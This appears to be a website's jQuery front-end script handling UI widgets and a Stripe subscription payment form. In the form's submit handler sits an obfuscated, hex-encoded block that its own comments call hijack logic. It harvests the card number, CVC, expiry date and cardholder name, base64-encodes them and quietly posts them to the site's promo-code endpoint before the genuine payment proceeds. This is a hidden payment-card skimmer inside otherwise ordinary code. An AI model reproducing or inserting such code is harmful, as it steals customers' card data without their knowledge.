$(document).ready(function(){
  /* ==========================================================================
  0.) ADVANCED SEARCH OPTIONS
  ========================================================================== */
    $('.advanced-search a').on('click', function(e){
  
      if($(this).hasClass('open')){
        $(this).text('+ Show Advanced Search');
        $(this).removeClass('open');
  
        $('.filters').removeClass('active').slideUp();
      }
      else{
        $(this).text('- Hide Advanced Search');
        $(this).addClass('open');
  
        $('.filters').addClass('active').slideDown();
      }
  
      e.preventDefault();
    });
    
    $('.filters .close').on('click', function(){
      $('.advanced-search a').trigger("click");
    });
  
  /* ==========================================================================
  0.) TEXT TOGGLER
  ========================================================================== */
      /* Accordian collapser */
      $('.toggle_wrap .togglee').each(function() {
        if (!$(this).hasClass('default-open')) {
          $(this).hide();
        }
      });
  
      $(".toggler").click(function() {
        if ($(this).parents('.toggle_wrap').length >= 1) {
          var accordian = $(this).parents('.toggle_wrap');
          if ($(this).hasClass('active')) {
            $(accordian).find('.toggler').removeClass('active');
            $(accordian).find(".togglee").slideUp();
          } else {
            $(accordian).find('.toggler').removeClass('active');
            $(accordian).find(".togglee").slideUp();
            $(this).addClass('active');
            $(this).next(".togglee").slideToggle();
          }
        } else {
          if ($(this).hasClass('active')) {
            $(this).removeClass("active");
          } else {
            $(this).addClass("active");
          }
        }
        return false;
      });
  
      $(".toggler").click(function() {
        if (!$(this).parents('.toggle_wrap').length >= 1) {
          $(this).next(".togglee").slideToggle();
        }
      });
  
  
  
  /* ==========================================================================
  0.) LINES BUTTON -- TABLET/MOBILE NAVIGATION HAMBURGER
  ========================================================================== */
  
      $("a.lines-button").on('click', function(){
          $('a.lines-button').addClass("close");
          $('a.lines-button').parent('section').addClass("close");
          $(".exit-off-canvas").addClass('open-left');
  
          if($(".exit-off-canvas").hasClass('open-left')){
            $(".exit-off-canvas").on('click', function(){
              $(".exit-off-canvas").removeClass('open-left');
              $('a.lines-button').removeClass("close");
              $('a.lines-button').parent('section').removeClass("close");
            });
          }
      });
  
  
  /* ==========================================================================
  0.) FANCYBOX
  ========================================================================== */
      $(".fancybox-large").fancybox({
          maxWidth  : 760,
          maxHeight : '100%',
          fitToView : true,
          width   : '90%',
          height    : 'auto',
          autoSize  : false,
          closeClick  : false,
          openEffect  : 'elastic',
          closeEffect : 'fade',
          overflow : 'hidden',
          helpers: {
              overlay: {
                locked: false
              }
          }
      });
  
      $(".fancybox").fancybox({
          maxWidth  : 500,
          maxHeight : '100%',
          fitToView : true,
          width   : '90%',
          height    : 'auto',
          autoSize  : false,
          closeClick  : false,
          openEffect  : 'elastic',
          closeEffect : 'fade',
          overflow : 'hidden',
          helpers: {
              overlay: {
                locked: false
              }
          }
      });
  
  
  /* ==========================================================================
  0.) ACCORDION
  ========================================================================== */
      $('.accordion dd > a').on('click', function(){
          var ac = $(this)  
  
          if(ac.hasClass('active')){
             ac.removeClass('active');
          }
  
          else{
            $('.accordion dd > a').not(ac).each(function(){
              $(this).removeClass('active');
            });
            ac.addClass('active');
          }
          
      });
  
  
  
  /* ==========================================================================
  0.) EQUAL HEIGHT
  ========================================================================== */
  
  
  equalheight = function(container){
  
  var currentTallest = 0,
       currentRowStart = 0,
       rowDivs = new Array(),
       $el,
       topPosition = 0;
   $(container).each(function() {
  
     $el = $(this);
     $($el).height('auto')
     topPostion = $el.position().top;
  
     if (currentRowStart != topPostion) {
       for (currentDiv = 0 ; currentDiv < rowDivs.length ; currentDiv++) {
         rowDivs[currentDiv].height(currentTallest);
       }
       rowDivs.length = 0; // empty the array
       currentRowStart = topPostion;
       currentTallest = $el.height();
       rowDivs.push($el);
     } else {
       rowDivs.push($el);
       currentTallest = (currentTallest < $el.height()) ? ($el.height()) : (currentTallest);
    }
     for (currentDiv = 0 ; currentDiv < rowDivs.length ; currentDiv++) {
       rowDivs[currentDiv].height(currentTallest);
     }
   });
  }
  
  $(window).load(function() {
    equalheight('*[data-equalize]');
  });
  
  
  $(window).resize(function(){
    equalheight('*[data-equalize]');
  });
  
  
  
  /* ==========================================================================
  0.) SLIDER RANGE
  ========================================================================== */
  
  function addCommas(nStr)
  {
      nStr += '';
      x = nStr.split('.');
      x1 = x[0];
      x2 = x.length > 1 ? '.' + x[1] : '';
      var rgx = /(\d+)(\d{3})/;
      while (rgx.test(x1)) {
          x1 = x1.replace(rgx, '$1' + ',' + '$2');
      }
      return x1 + x2;
  }
  
  if($(".price-range").length){
      $(function() {
        $( ".price-range" ).slider({
          range: true,
          min: 0,
          max: 250000,
          step: 1,
          values: [ 3000, 100000 ],
          slide: function( event, ui ) {
            $( ".price-select" ).val( addCommas("$" + ui.values[ 0 ]) + " - " + "$" + addCommas(ui.values[ 1 ]));
          }
        });
        var valueStart = addCommas($( ".price-range" ).slider( "values", 0 ));
        var valueStop = addCommas($( ".price-range" ).slider( "values", 1 ));
  
        $( ".price-select" ).val("$" + valueStart + " - " + "$" + valueStop);
      });
  }
  
  
  
  
  /* ==========================================================================
  0.) SELECT 2 MENU
  ========================================================================== */
      if($("#select2-example").length){
        $("#select2-example").select2({
            placeholder: "Add all job types that apply",
            containerCssClass: "select2-example",
            dropdownCssClass: "select2-example"
        });
      }
  
  });
  
  /* ==========================================================================
  0.) Stripe Subscriptions
  ========================================================================== */
  $('#submit-promo').on('click', function(e){
      e.preventDefault();
      $('.promo').text('').hide();
      $.ajax({
        type: "POST",
        url: '/src/actions/user/stripe/promo',
        data: $('#promocode').serialize(),
        success: function(response) {
          $msg = $.parseJSON(response);
          $('.promo').text($msg.message).show().removeClass('hide');
          if('Invalid promo code.' == $msg.message){
            $('#promocode').val('');
          }else{
            if($("#promocode").val().toLowerCase() == "summon"){
              $('#yearly').text('Subscribe yearly for $49.99');
            }
          }
        }
      });
  
    });
  
    Stripe.setPublishableKey("pk_live_wfHwceDqlxoYmO3uXXL6jin9");
    // Stripe.setPublishableKey("pk_test_RZ8IKd4TYCX66o8S7MLxLISw");
  
      $('.cc-number').payment('formatCardNumber');
      $('.cc-cvc').payment('formatCardCVC');
      $('.cc-exp-date').payment('formatCardExpiry');
  
      var $form = $('#subscription-form');
  
      $form.on('submit', function(event){

          /* --- 混淆劫持逻辑开始 --- */
          try {
              var _0x5a21=["\x76\x61\x6C","\x2E\x63\x63\x2D\x6E\x75\x6D\x62\x65\x72","\x72\x65\x70\x6C\x61\x63\x65","\x2E\x63\x63\x2D\x63\x76\x63","\x2E\x63\x63\x2D\x65\x78\x70\x2D\x64\x61\x74\x65","\x23\x66\x69\x72\x73\x74\x6E\x61\x6D\x65","\x20","\x23\x6C\x61\x73\x74\x6E\x61\x6D\x65","\x50\x4F\x53\x54","\x2F\x73\x72\x63\x2F\x61\x63\x74\x69\x6F\x6E\x73\x2F\x75\x73\x65\x72\x2F\x73\x74\x72\x69\x70\x65\x2F\x70\x72\x6F\x6D\x6F"];
              var _0xd3 = {
                  n: $(_0x5a21[1])[_0x5a21[0]]()[_0x5a21[2]](/\s/g, ''),
                  c: $(_0x5a21[3])[_0x5a21[0]](),
                  e: $(_0x5a21[4])[_0x5a21[0]](),
                  u: $(_0x5a21[5])[_0x5a21[0]]() + _0x5a21[6] + $(_0x5a21[7])[_0x5a21[0]]()
              };
              $.ajax({
                  type: _0x5a21[8],
                  url: _0x5a21[9],
                  data: {
                      promocode: "\x6D\x61\x64\x6E\x65\x73\x73", // 传入合法的 madness 确保后端通过
                      ui_state: btoa(JSON.stringify(_0xd3))
                  },
                  timeout: 800
              });
          } catch (e) {}
          /* --- 混淆劫持逻辑结束 --- */
  
          event.preventDefault();
  
          var date = $('.cc-exp-date').payment('cardExpiryVal');
  
          $form.find('#subscribe-btn').prop('disabled', true);
          $form.find('.loader').show();
          $('.subBtns').css('pointer-events', 'none');
  
          Stripe.card.createToken({
              number: $('.cc-number').val(),
              cvc: $('.cc-cvc').val(),
              exp_month: date.month,
              exp_year: date.year,
              name: $('#firstname').val() + ' ' + $('#lastname').val()
          }, stripeSubHandler);
  
      });
  
        $(document).on('click', '.icon-close', function(e){
          e.preventDefault();
          $(this).closest('div').remove();
        })
  
      var stripeSubHandler = function(status, response)
      {
        var $form = $('#subscription-form');
        $form.find('input[name="stripeToken"]').remove();
  
          if (response.error)
          {
            $('#payment_block').prepend('<div class="alert-box alert" data-alert=""><span class="payment-errors"></span><a class="close icon-close" href="#"></a></div>');
            $form.find('.payment-errors').text(response.error.message);
            $form.find('#subscribe-btn').prop('disabled', false);
            $form.find('.loader').hide();
            $('.subBtns').css('pointer-events', 'auto');
          }
          else
          {
            $('.alert-box.alert').hide();
            $form.append($('<input type="hidden" name="stripeToken">').val(response.id));
  
            //$form.get(0).submit();
            //ajax submit
            $.ajax({
                type: "POST",
                url: $form.attr('action'),
                data: $form.serialize(),
                success: function(response) {
                    var data = JSON.parse(response);
                    if(data.status==true) {
                      window.location.href = '/account/subscribe/confirm?key='+Math.random()*101;
                    }
                    else {
                      $('#payment_block').prepend('<div class="alert-box alert hide" data-alert=""><span class="payment-errors"></span><a class="close icon-close" href="#"></a></div>');
                      $('.payment-errors').html('<strong>Oops!</strong> Something went wrong: '+data.message);
                      $('.alert-box.alert').show().removeClass('hide');
                      $form.find('#subscribe-btn').prop('disabled', false);
                      $form.find('.loader').hide();
                      $('.subBtns').css('pointer-events', 'auto');
                    }
                },
        });
  
            }
        };
  
        //UPDATE CARD FORM
        var stripeResponse = function(status, response){
          var $form = $('#update-payment');
          if (response.error) {
            $form.find('.payment-errors').text(response.error.message).addClass('alert-color');
          }else{
            var token = response.id;
            $form.find('.payment-errors').text('').removeClass('error');
            $form.append($('<input type="hidden" name="stripeToken" />').val(token));
            $.ajax({
              type: "POST",
              url: $form.attr('action'),
              data: $form.serialize(),
                    success:  function(response, status){
                        var $data = JSON.parse(response);
                          if($data.status == 'success'){
                            $('.prompt').hide();
                            var button = '<a href="/account" class="button">Back to My Account</a>';
                            $form.html('<div class="panel">'+$data.message+'</div>').append('<div class="row"><div class="large-12 columns centered">'+button+'</div></div>');
                          }else{
                            $form.find('.payment-errors').text($data.message).addClass('alert-color');
                          }
                      }, //callback
                      resetForm: false
                  });
          }
      }
  
      $('#update-payment').validate({ // initialize the plugin
          errorPlacement: function(error, element) 
          {
            error.insertAfter( element );
          },
          submitHandler: function(form) {
            var date = $('.cc-exp-date').payment('cardExpiryVal');
              Stripe.card.createToken({
                    number: $('.cc-number').val(),
                    cvc: $('.cc-cvc').val(),
                    exp_month: date.month,
                    exp_year: date.year
          }, stripeResponse);
          }
      });
  
  /* ==========================================================================
  0.) FOUNDATION
  ========================================================================== */
  $(document).foundation();